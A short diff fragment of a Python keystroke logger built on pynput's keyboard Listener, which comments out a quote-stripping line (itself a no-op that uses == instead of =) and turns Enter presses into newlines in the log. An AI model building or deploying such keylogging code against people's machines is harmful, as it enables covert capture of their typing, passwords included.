@@ -2,7 +2,7 @@ from pynput.keyboard import Listener
 
 def write_to_file(key):
     key_data=str(key)
-    key_data==key_data.replace("'","")
+    # key_data==key_data.replace("'","")
 
     if key_data == 'Key.enter':
         key_data='\n' 
